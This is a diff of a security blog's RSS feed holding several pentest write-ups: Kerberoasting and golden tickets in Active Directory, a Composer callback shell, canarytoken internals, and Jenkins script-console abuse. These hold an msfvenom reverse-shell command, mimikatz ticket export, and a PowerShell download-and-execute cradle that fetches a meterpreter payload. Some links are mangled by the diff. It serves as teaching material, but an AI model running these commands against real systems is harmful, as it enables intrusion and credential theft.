@@ -32,13 +32,13 @@
 
 &lt;p&gt;This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!&lt;/p&gt;
 
-&lt;h2 id=&#34;lets-set-the-scene:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;lets set the scene&lt;/h2&gt;
+&lt;h2 id=&#34;lets-set-the-scene&#34;&gt;lets set the scene&lt;/h2&gt;
 
 &lt;p&gt;Kerberos, a network authentication protocol that works off a ticketing type system is deeply baked into Active Directory. Of late, a lot more focus has been put on it by the offensive security community as you will see later in this post. I am not going to go into much (if any) of the technicalities of Kerberos itself as I feel there really is more than enough resources out there you can refer to! The below list references some great posts about the same topic I am writing about there:&lt;/p&gt;
 
 &lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Kerberos_(protocol)&#34;&gt;https://en.wikipedia.org/wiki/Kerberos_(protocol)&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx&#34;&gt;https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;[&lt;a href=&#34;https://en.wikipedia.org/wiki/Kerberos_(protocol)](https://en.wikipedia.org/wiki/Kerberos_(protocol)&#34;&gt;https://en.wikipedia.org/wiki/Kerberos_(protocol)](https://en.wikipedia.org/wiki/Kerberos_(protocol)&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;[&lt;a href=&#34;https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx&#34;&gt;https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx&lt;/a&gt;)&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/&#34;&gt;http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=2362&#34;&gt;https://adsecurity.org/?p=2362&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
@@ -58,9 +58,9 @@
 
 &lt;p&gt;One last bit of scene setting I think is important is to state the fact that we are going to try and be as quiet as possible now that we have the meterpreter shell up.&lt;/p&gt;
 
-&lt;h1 id=&#34;spn-scanning-the-setup:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;spn scanning - the setup&lt;/h1&gt;
+&lt;h1 id=&#34;spn-scanning-the-setup&#34;&gt;spn scanning - the setup&lt;/h1&gt;
 
-&lt;p&gt;One of the avenues we can pursue now is to query Active Directory for objects that have a &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949(v=vs.85).aspx&#34;&gt;Service Principal Name&lt;/a&gt; set.&lt;/p&gt;
+&lt;p&gt;One of the avenues we can pursue now is to query Active Directory for objects that have a [Service Principal Name](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949(v=vs.85).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949(v=vs.85).aspx&lt;/a&gt;) set.&lt;/p&gt;
 
 &lt;blockquote&gt;
 &lt;p&gt;A service principal name (SPN) is the name by which a client uniquely identifies an instance of a service. If you install multiple instances of a service on computers throughout a forest, each instance must have its own SPN.&lt;/p&gt;
@@ -89,7 +89,7 @@ Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,D
 Updated object
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;spn-scanning-the-offensive-perspective:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;spn scanning - the offensive perspective&lt;/h2&gt;
+&lt;h2 id=&#34;spn-scanning-the-offensive-perspective&#34;&gt;spn scanning - the offensive perspective&lt;/h2&gt;
 
 &lt;p&gt;Right, with the configuration done, lets put on our offensive hats and try and abuse this. I think one thing that one should realize is that this is a very nice way to get a &lt;em&gt;free port scan&lt;/em&gt; done too. You will see in a moment. =]&lt;/p&gt;
 
@@ -97,7 +97,7 @@ Updated object
 
 &lt;p&gt;To use the powershell module, the easiest will be to get an interactive powershell session up and running. If you have ever tried this from meterpreter, you will know that if you try and spawn &lt;code&gt;powershell.exe&lt;/code&gt; from a cmd shell, you will not get anywhere. Very frustrating. Its not impossible though! We are however going to go through the efforts of getting a working PowerShell session up as we will be using it extensively throughout this post.&lt;/p&gt;
 
-&lt;h3 id=&#34;setup-a-powershell-connection:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;setup a powershell connection&lt;/h3&gt;
+&lt;h3 id=&#34;setup-a-powershell-connection&#34;&gt;setup a powershell connection&lt;/h3&gt;
 
 &lt;p&gt;We can use the meterpreter session to get a powershell session. First, we will create a payload to execute as a script using the &lt;code&gt;exec_powershell&lt;/code&gt; post module. In a new terminal, run &lt;code&gt;msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw&lt;/code&gt;:&lt;/p&gt;
 
@@ -181,7 +181,7 @@ PS C:\Users\bobs\Downloads&amp;gt;
 
 &lt;p&gt;This is the part where I remind you about the &lt;em&gt;free port scan&lt;/em&gt; I mentioned earlier. Notice how we have discovered services, ports and accounts running them using just a LDAP query. I highly doubt that will trigger many monitoring tools out there!&lt;/p&gt;
 
-&lt;h2 id=&#34;kerberos-service-tickets:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;kerberos service tickets&lt;/h2&gt;
+&lt;h2 id=&#34;kerberos-service-tickets&#34;&gt;kerberos service tickets&lt;/h2&gt;
 
 &lt;p&gt;We now have 2 SPN&amp;rsquo;s that we managed to query off the domain. &lt;code&gt;svcSQLServ/pc1.foo.local:1433&lt;/code&gt; &amp;amp; &lt;code&gt;svcSQLServ/pc2.foo.local:1433&lt;/code&gt;. In order for clients to be able to authenticate to the services running as this user via kerberos, they would typically go through the process of requesting a service ticket.&lt;/p&gt;
 
@@ -189,7 +189,7 @@ PS C:\Users\bobs\Downloads&amp;gt;
 
 &lt;p&gt;What does that mean for an attacker? Well, we can request the service ticket&amp;hellip; and&amp;hellip; attempt to decrypt it by brute forcing it offline! If the decryption is successful, then we have successfully compromised a service account.&lt;/p&gt;
 
-&lt;h2 id=&#34;enter-kerberoast:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;enter kerberoast&lt;/h2&gt;
+&lt;h2 id=&#34;enter-kerberoast&#34;&gt;enter kerberoast&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt; is a tool that can amongst other things, crack Kerberos ticket passwords. The general idea is that we get the SPN&amp;rsquo;s (like we did), request kerberos service tickets for them, dump the ticket out of memory and send it to the &lt;code&gt;tgsrepcrack.py&lt;/code&gt; script to crack against a wordlist.&lt;/p&gt;
 
@@ -279,7 +279,7 @@ PS C:\&amp;gt; Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object Sy
 &lt;/figure&gt;
 
 
-&lt;h2 id=&#34;dumping-kerberos-tickets-from-memory:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;dumping kerberos tickets from memory&lt;/h2&gt;
+&lt;h2 id=&#34;dumping-kerberos-tickets-from-memory&#34;&gt;dumping kerberos tickets from memory&lt;/h2&gt;
 
 &lt;p&gt;Remember, all of the actions performed thus far have been as a normal AD user with no special privileges. With the tickets now in memory, we can dump them to a file using mimikatz again. The mimikatz command we will use for this is &lt;code&gt;kerberos::list /export&lt;/code&gt;:&lt;/p&gt;
 
@@ -294,7 +294,7 @@ PS C:\&amp;gt; Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object Sy
 
 &lt;p&gt;&lt;code&gt;1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi&lt;/code&gt; is the Kerberos ticket dumped to disk! We can now transfer this to some place where we have Kerberoast downloaded and start cracking it! :D&lt;/p&gt;
 
-&lt;h2 id=&#34;cracking-the-kerberos-ticket:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;cracking the kerberos ticket&lt;/h2&gt;
+&lt;h2 id=&#34;cracking-the-kerberos-ticket&#34;&gt;cracking the kerberos ticket&lt;/h2&gt;
 
 &lt;p&gt;Back at my meterpreter session, we can simply download the ticket locally, and start the crack. &lt;code&gt;tgsrepcrack.py&lt;/code&gt; allows you to specify tickets with a wildcard, so it will run the wordlist recursively over all of the tickets in a directory.&lt;/p&gt;
 
@@ -358,7 +358,7 @@ The command completed successfully.
 PS C:\&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;testing-the-credentials:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;testing the credentials&lt;/h2&gt;
+&lt;h2 id=&#34;testing-the-credentials&#34;&gt;testing the credentials&lt;/h2&gt;
 
 &lt;p&gt;For a bit of fun, lets test the credentials we just got using PowerShell Remoting. PowerShell Remoting is on by default on Server 2012 I believe.&lt;/p&gt;
 
@@ -382,7 +382,7 @@ Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
 
 &lt;p&gt;So, we popped a service account with waaaay too much permissions and a crappy password. All that as a normal AD user&amp;hellip;&lt;/p&gt;
 
-&lt;h1 id=&#34;golden-tickets:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;golden tickets&lt;/h1&gt;
+&lt;h1 id=&#34;golden-tickets&#34;&gt;golden tickets&lt;/h1&gt;
 
 &lt;p&gt;We have domain administrative rights now. There is nothing left to do, we can write the pentest report and go home. Or can we? Well yes, but what if the password to &lt;code&gt;svcSQLServ&lt;/code&gt; changes? That would mean we lose access! One way we can prevent this is by creating a &lt;em&gt;golden ticket&lt;/em&gt; that we can re-use to grant ourselves whatever permission we like, as any user we like! Sounds great eh :D&lt;/p&gt;
 
@@ -447,7 +447,7 @@ svcSQLServ
 &lt;li&gt;A username (fake or real, does not matter. Not fake if you need opsec ofc!). &lt;code&gt;darthvader&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;creating-the-golden-ticket:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;creating the golden ticket&lt;/h2&gt;
+&lt;h2 id=&#34;creating-the-golden-ticket&#34;&gt;creating the golden ticket&lt;/h2&gt;
 
 &lt;p&gt;Creating the golden ticket is now a really simple task. We will simply call &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; again to generate the ticket. It will be saved to disk when it is generated. Thereafter, we will purge all the tickets we have for the session, and inject the golden ticket and test our access!&lt;/p&gt;
 
@@ -467,7 +467,7 @@ svcSQLServ
 &lt;/figure&gt;
 
 
-&lt;h2 id=&#34;injecting-the-golden-ticket:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;injecting the golden ticket&lt;/h2&gt;
+&lt;h2 id=&#34;injecting-the-golden-ticket&#34;&gt;injecting the golden ticket&lt;/h2&gt;
 
 &lt;p&gt;The final test is to &lt;em&gt;use&lt;/em&gt; this ticket. For that, we will purge all Kerberos tickets in memory and inject the new golden ticket. Thereafter we will test if we can read the administrative &lt;code&gt;c$&lt;/code&gt; share of the Domain Controller!&lt;/p&gt;
 
@@ -494,16 +494,16 @@ Ticket(s) purge for current session is OK
 
 &lt;p&gt;After the ticket is injected into memory, we can verify its existence with the mimikaz &lt;code&gt;kerberos::list&lt;/code&gt; command, or just using &lt;code&gt;klist&lt;/code&gt;. Once it is injected, we &lt;code&gt;dir&lt;/code&gt; the Domain Controllers &lt;code&gt;c$&lt;/code&gt; share&amp;hellip; an &lt;em&gt;smile&lt;/em&gt;. The password for &lt;code&gt;scvSQLServ&lt;/code&gt; can now change, it will no longer bother us!&lt;/p&gt;
 
-&lt;p&gt;
+
 &lt;figure &gt;
     
         &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_admin.png&#34; /&gt;
     
     
 &lt;/figure&gt;
-&lt;/p&gt;
 
-&lt;h2 id=&#34;conclusion:ce81084d40d1d45730db49c3f0a902c4&#34;&gt;conclusion&lt;/h2&gt;
+
+&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;
 
 &lt;p&gt;In this post we saw how it is possible to &amp;lsquo;crack&amp;rsquo; badly passworded and configured service accounts by querying for accounts by Service Principal Names. Those SPN&amp;rsquo;s were then used to request Service Tickets from the Domain Controller, extracted from memory and cracked offline. All of that as a normal domain user.&lt;/p&gt;
 
@@ -521,7 +521,7 @@ Ticket(s) purge for current session is OK
       <guid>https://leonjza.github.io/blog/2015/09/30/a-totally-unnecessary-composer-shell/</guid>
       <description>
 
-&lt;h2 id=&#34;background:81933f3676c079333a579b7c058765d8&#34;&gt;background&lt;/h2&gt;
+&lt;h2 id=&#34;background&#34;&gt;background&lt;/h2&gt;
 
 
 &lt;figure &gt;
@@ -540,12 +540,12 @@ Callbacks are normally triggered just before or after certain events.&lt;/p&gt;
 &lt;p&gt;It is possible to provide shell commands to the &lt;code&gt;scripts&lt;/code&gt; property in the required &lt;code&gt;composer.json&lt;/code&gt; file (with a few restrictions), but this method echoes the command that it executes.
 A slightly more covert approach would be to execute a cleverly named static function in a class included in the codebase. It has to be one that can be autoloaded by composer.&lt;/p&gt;
 
-&lt;h2 id=&#34;why:81933f3676c079333a579b7c058765d8&#34;&gt;why?&lt;/h2&gt;
+&lt;h2 id=&#34;why&#34;&gt;why?&lt;/h2&gt;
 
 &lt;p&gt;I thought a little about which scenarios this may actually be useful in and figured maybe only really strange edge cases where you can only run composer (as root lol?).
 I also remembered a bug in &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial&#34;&gt;git&lt;/a&gt; (CVE-2014-9390) that allowed for code execution via &amp;lsquo;poisoned&amp;rsquo; repositories. Well, I guess depending on your perspective, this may be a very similar.&lt;/p&gt;
 
-&lt;h2 id=&#34;poc:81933f3676c079333a579b7c058765d8&#34;&gt;PoC&lt;/h2&gt;
+&lt;h2 id=&#34;poc&#34;&gt;PoC&lt;/h2&gt;
 
 &lt;p&gt;As part of a PoC, I just used the popular &lt;a href=&#34;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&#34;&gt;pentest-monkey PHP reverse shell&lt;/a&gt;, but really, anything is possible that is possible with PHP at this point.&lt;/p&gt;
 
@@ -561,7 +561,7 @@ I also remembered a bug in &lt;a href=&#34;https://community.rapid7.com/communit
       <guid>https://leonjza.github.io/blog/2015/09/10/canarytokens---the-maybe-not-so-obvious/</guid>
       <description>
 
-&lt;h2 id=&#34;introduction:dd35a277eae59d5b90ba22349ff178c1&#34;&gt;introduction&lt;/h2&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;
 
 
 &lt;figure &gt;
@@ -576,7 +576,7 @@ I also remembered a bug in &lt;a href=&#34;https://community.rapid7.com/communit
 
 &lt;p&gt;In this post, I just want to take a few moments and jot down my findings when investigating the documents generated by this project.&lt;/p&gt;
 
-&lt;h2 id=&#34;read-the-source-luke:dd35a277eae59d5b90ba22349ff178c1&#34;&gt;read the source luke&lt;/h2&gt;
+&lt;h2 id=&#34;read-the-source-luke&#34;&gt;read the source luke&lt;/h2&gt;
 
 &lt;p&gt;Most of the functionality that the canarytokens project provides for services make perfect sense. Things like the &lt;em&gt;Web Bugs&lt;/em&gt;, &lt;em&gt;DNS Tokens&lt;/em&gt; and &lt;em&gt;SQL Triggers&lt;/em&gt; are not hard concepts to grasp. In fact, they mostly use the actual protocols used for the triggers. The odd one out in that list I guess is the &lt;em&gt;SQL Triggers&lt;/em&gt;. From the code snippet for the trigger that is provided, one can see that it leverages &lt;code&gt;xp_fileexist&lt;/code&gt; and &lt;code&gt;xp_dirtree&lt;/code&gt;. Searching &lt;a href=&#34;https://social.msdn.microsoft.com/Search/en-US?query=xp_fileexist&amp;amp;emptyWatermark=true&amp;amp;ac=4#refinementChanges=49&amp;amp;pageNumber=1&amp;amp;showMore=false&#34;&gt;MSDN&lt;/a&gt; for this &lt;code&gt;xp_fileexist&lt;/code&gt; function quickly reveals that its actually considered an &lt;a href=&#34;https://social.msdn.microsoft.com/Forums/sqlserver/en-US/ca770449-2ed0-4e5e-9644-994968b45764/xpcmdshell-dir-command-to-check-if-file-exists?forum=transactsql#0f6db936-5c32-403c-b073-d5c7e76ad212&#34;&gt;&amp;ldquo;undocumented feature&amp;rdquo;&lt;/a&gt; (though I did not really bother trying to confirm this statement) that checks for the existence of a file. Besides the point, all this trigger does is compile a UNC path and executes the file existence check. This results in the DNS lookup happening to the canarytoken provided host once the SQL trigger files and tries to check if the file exists.&lt;/p&gt;
 
@@ -593,7 +593,7 @@ I also remembered a bug in &lt;a href=&#34;https://community.rapid7.com/communit
 
 &lt;p&gt;I spent quite a bit of time getting my head around the &lt;a href=&#34;https://github.com/thinkst/canarytokens&#34;&gt;published source code&lt;/a&gt; to learn the tricks. I was able to get a good idea of how it works, but realized it may be worth more if I inspected the generated docs themselves.&lt;/p&gt;
 
-&lt;h2 id=&#34;canarytokens-generated-pdf:dd35a277eae59d5b90ba22349ff178c1&#34;&gt;canarytokens generated PDF&lt;/h2&gt;
+&lt;h2 id=&#34;canarytokens-generated-pdf&#34;&gt;canarytokens generated PDF&lt;/h2&gt;
 
 &lt;p&gt;My first target was the generated PDF. I used the &lt;a href=&#34;http://canarytokens.org&#34;&gt;website&lt;/a&gt; to generate myself a token and downloaded the PDF. I decided to fire up &lt;code&gt;peepdf&lt;/code&gt; to analyze the internals.&lt;/p&gt;
 
@@ -665,7 +665,7 @@ I also remembered a bug in &lt;a href=&#34;https://community.rapid7.com/communit
 
 &lt;p&gt;So, my guess is as soon as the doc is opened, this URI will be resolved as part of the parsing process, and the canarytoken trigger fired. That left me satisfied in accepting how it works :P&lt;/p&gt;
 
-&lt;h2 id=&#34;canarytokens-generated-docx:dd35a277eae59d5b90ba22349ff178c1&#34;&gt;canarytokens generated DOCX&lt;/h2&gt;
+&lt;h2 id=&#34;canarytokens-generated-docx&#34;&gt;canarytokens generated DOCX&lt;/h2&gt;
 
 &lt;p&gt;The word doc on the other hand is a lot easier to understand. Downloading the generated honeydoc from canarytokens.org revealed to be a standard docx file.&lt;/p&gt;
 
@@ -691,7 +691,7 @@ I also remembered a bug in &lt;a href=&#34;https://community.rapid7.com/communit
 
 &lt;p&gt;When you take a moment a read the Wikipedia entry for the &lt;a href=&#34;https://en.wikipedia.org/wiki/Office_Open_XML_file_formats#Relationships&#34;&gt;Office Open XML Format&lt;/a&gt;, one will quickly see that it is possible to reference external images. It is for this reason that it is possible to have the word processor hit the trigger URL during parsing as it gets ready to pull the external image in.&lt;/p&gt;
 
-&lt;h2 id=&#34;conclusion:dd35a277eae59d5b90ba22349ff178c1&#34;&gt;conclusion&lt;/h2&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;
 
 &lt;p&gt;I think there is a lot of merit in this project. The methods used are obviously not fool proof, and if you are a really careful advesary and aware of these things then you will most probably not open docs from internet connected machines or ones without proper egress firewalling.&lt;/p&gt;
 
@@ -716,17 +716,17 @@ I also remembered a bug in &lt;a href=&#34;https://community.rapid7.com/communit
 &lt;/figure&gt;
 
 
-&lt;h1 id=&#34;tl-dr:cab6ac3605a584decefea22e2031b675&#34;&gt;tl;dr&lt;/h1&gt;
+&lt;h1 id=&#34;tl-dr&#34;&gt;tl;dr&lt;/h1&gt;
 
 &lt;p&gt;Flick II just got published on &lt;a href=&#34;https://www.vulnhub.com/entry/flick-2,122/&#34;&gt;Vulnhub&lt;/a&gt;! You should try it =)&lt;/p&gt;
 
-&lt;h2 id=&#34;introduction:cab6ac3605a584decefea22e2031b675&#34;&gt;introduction&lt;/h2&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;
 
 &lt;p&gt;After about a year since &lt;a href=&#34;https://www.vulnhub.com/entry/flick-1,99/&#34;&gt;Flick I&lt;/a&gt;, I have finally managed to get Flick II out to VulnHub. I learned a lot from Flick I and as a result applied it to Flick II. The making of Flick II was also a very different story. If I have to compare it to the first one (which took 3 nights to build start to finish), Flick II took &lt;em&gt;waay&lt;/em&gt; longer. I think the total build / testing time must be over a month.&lt;/p&gt;
 
 &lt;p&gt;Originally I had a whole bunch of ideas, and after lots of trial and error, came to what it has become today. I have to give a special shouts to &lt;a href=&#34;https://twitter.com/s4gi_&#34;&gt;@s4gi_&lt;/a&gt; for the inspiration to go with the mobile app idea and &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; for testing the first &lt;em&gt;really&lt;/em&gt; broken version :P&lt;/p&gt;
 
-&lt;h2 id=&#34;preparation:cab6ac3605a584decefea22e2031b675&#34;&gt;preparation&lt;/h2&gt;
+&lt;h2 id=&#34;preparation&#34;&gt;preparation&lt;/h2&gt;
 
 &lt;p&gt;I believe Flick II will be the first Vulnerable VM on &lt;a href=&#34;https://twitter.com/VulnHub&#34;&gt;@VulnHub&lt;/a&gt; with a mobile twist to it. That means you will need to either install the bundled &lt;code&gt;.apk&lt;/code&gt; on an Android phone, or run it in an Android emulator in order to progress on the path to root! The &lt;code&gt;.apk&lt;/code&gt; is self-signed so expect Android to complain about that if you install it on a phone. Don&amp;rsquo;t feel bad if you don’t trust me (aka. some random guy on the internet). If you don’t, your safest bet then is to use an emulator. The only real requirement for the &lt;code&gt;.apk&lt;/code&gt; is that the mobile app must be able to speak to the VM and be run on a relatively recent Android version.&lt;/p&gt;
 
@@ -755,7 +755,7 @@ I also remembered a bug in &lt;a href=&#34;https://community.rapid7.com/communit
 
 &lt;p&gt;Recently I came across a few &lt;a href=&#34;https://jenkins-ci.org/&#34;&gt;Jenkins&lt;/a&gt; continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be &lt;em&gt;&amp;lsquo;secure&amp;rsquo;&lt;/em&gt;. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.&lt;/p&gt;
 
-&lt;h2 id=&#34;groooooooovy:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;groooooooovy&lt;/h2&gt;
+&lt;h2 id=&#34;groooooooovy&#34;&gt;groooooooovy&lt;/h2&gt;
 
 &lt;p&gt;At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the &lt;em&gt;Script Console&lt;/em&gt; that Jenkins provides:&lt;/p&gt;
 
@@ -787,7 +787,7 @@ println &amp;quot;Found text ${process.text}&amp;quot;
 
 &lt;p&gt;Nice and easy command execution! :D&lt;/p&gt;
 
-&lt;h2 id=&#34;interactive-shell-power-shell:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;interactive shell, power shell&lt;/h2&gt;
+&lt;h2 id=&#34;interactive-shell-power-shell&#34;&gt;interactive shell, power shell&lt;/h2&gt;
 
 &lt;p&gt;Getting an interactive shell on linux based hosts was as simple as picking your favorite flavor of &lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;&gt;reverse shell&lt;/a&gt; and moving on from there. On Windows based environments though, the builtin &lt;code&gt;cmd.exe&lt;/code&gt; definitely has its limitations. For this reason, reaching out for a meterpreter shell is almost a knee-jerk reaction.&lt;/p&gt;
 
@@ -797,7 +797,7 @@ println &amp;quot;Found text ${process.text}&amp;quot;
 
 &lt;p&gt;In essence, getting the meterpreter shell up required 2 things (apart from the command execution). A &lt;code&gt;payload&lt;/code&gt; which includes the &lt;code&gt;Invoke-Shellcode.ps1&lt;/code&gt; powershell script together with the meterpreter connection details, and an encoded powershell command to be executed using the command execution we have. Together these will download the hosted payload and prepare the meterpreter. If this sounds a little confusing, don&amp;rsquo;t worry it should be more clear after we have gone through it.&lt;/p&gt;
 
-&lt;h2 id=&#34;preparing-the-payload:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;preparing the payload&lt;/h2&gt;
+&lt;h2 id=&#34;preparing-the-payload&#34;&gt;preparing the payload&lt;/h2&gt;
 
 &lt;p&gt;As already mentioned, I was going to use &lt;code&gt;Invoke-Shellcode.ps1&lt;/code&gt; from &lt;a href=&#34;https://github.com/mattifestation/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt;. This will go into the payload that needs to be downloaded to bring the meterpreter up. When talking about &lt;em&gt;payload&lt;/em&gt; here, all it really is is a file that will be made available via HTTP for the powershell script to download.&lt;/p&gt;
 
@@ -813,9 +813,9 @@ println &amp;quot;Found text ${process.text}&amp;quot;
 
 &lt;p&gt;This file was finally served via HTTP using the python SimpleHTTPServer with &lt;code&gt;python -m SimpleHTTPServer&lt;/code&gt; which meant that it would be available at &lt;a href=&#34;http://192.168.252.1:8000/payload&#34;&gt;http://192.168.252.1:8000/payload&lt;/a&gt;.&lt;/p&gt;
 
-&lt;h2 id=&#34;preparing-the-command:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;preparing the command&lt;/h2&gt;
+&lt;h2 id=&#34;preparing-the-command&#34;&gt;preparing the command&lt;/h2&gt;
 
-&lt;p&gt;Next, we need to prepare the actual command to run. We will make use of the powershell &lt;a href=&#34;https://technet.microsoft.com/en-us/library/hh849893.aspx&#34;&gt;Invoke-Expression&lt;/a&gt; command and give it a &lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx&#34;&gt;Net.WebClient.DownloadString&lt;/a&gt; object to download the payload we previously prepared and execute it.&lt;/p&gt;
+&lt;p&gt;Next, we need to prepare the actual command to run. We will make use of the powershell &lt;a href=&#34;https://technet.microsoft.com/en-us/library/hh849893.aspx&#34;&gt;Invoke-Expression&lt;/a&gt; command and give it a [Net.WebClient.DownloadString](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx&lt;/a&gt;) object to download the payload we previously prepared and execute it.&lt;/p&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.252.1:8000/payload&#39;)
 &lt;/code&gt;&lt;/pre&gt;
@@ -830,7 +830,7 @@ println &amp;quot;Found text ${process.text}&amp;quot;
 &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4 [snip] BjBkACcAKQAKAA==
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;pwn:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;pwn&lt;/h2&gt;
+&lt;h2 id=&#34;pwn&#34;&gt;pwn&lt;/h2&gt;
 
 &lt;p&gt;So, I now had the &lt;code&gt;payload&lt;/code&gt; file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!&lt;/p&gt;
 
@@ -863,7 +863,7 @@ meterpreter &amp;gt; getuid
 Server username: NT AUTHORITY\SYSTEM
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;automation:35eefdc71518d1a65a4e14a71c4812fa&#34;&gt;automation&lt;/h2&gt;
+&lt;h2 id=&#34;automation&#34;&gt;automation&lt;/h2&gt;
 
 &lt;p&gt;While testing this, I slapped together a small script that will prepare the command to run and start the SimpleHTTPServer:&lt;/p&gt;
 
@@ -906,7 +906,7 @@ python -m SimpleHTTPServer
       <guid>https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises---nebula/</guid>
       <description>
 
-&lt;h2 id=&#34;introduction:0683a5d670a26d450d97365e52610fb5&#34;&gt;introduction&lt;/h2&gt;
+&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;
 
 &lt;p&gt;Recently I decided I wanted to have a look at what &lt;a href=&#34;https://exploit-exercises.com/&#34;&gt;Exploit Exercises&lt;/a&gt; had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for &lt;a href=&#34;https://exploit-exercises.com/nebula/&#34;&gt;Nebula&lt;/a&gt;. &lt;em&gt;Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.&lt;/em&gt;&lt;/p&gt;
 
@@ -923,7 +923,7 @@ python -m SimpleHTTPServer
 
 &lt;p&gt;This is the path I took to solve the 20 challenges.&lt;/p&gt;
 
-&lt;h2 id=&#34;setup:0683a5d670a26d450d97365e52610fb5&#34;&gt;setup&lt;/h2&gt;
+&lt;h2 id=&#34;setup&#34;&gt;setup&lt;/h2&gt;
 
 &lt;p&gt;On the details page, one could easily learn the format of the challenges, as well as some information should you need to get root access on the VM to configure things. Obviously the point is not to login with this account to solve challenges, but merely to fix things if they are broken for some reason.&lt;/p&gt;
 
@@ -995,7 +995,7 @@ int main(void) {
 
 &lt;p&gt;This shell was reused throughout the challenges. Lets dig into the challenges themselves.&lt;/p&gt;
 
-&lt;h2 id=&#34;level00:0683a5d670a26d450d97365e52610fb5&#34;&gt;level00&lt;/h2&gt;
+&lt;h2 id=&#34;level00&#34;&gt;level00&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level00/&#34;&gt;Level00&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;
 
@@ -1027,7 +1027,7 @@ flag00@nebula:~$ getflag
 You have successfully executed getflag on a target account
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;level01:0683a5d670a26d450d97365e52610fb5&#34;&gt;level01&lt;/h2&gt;
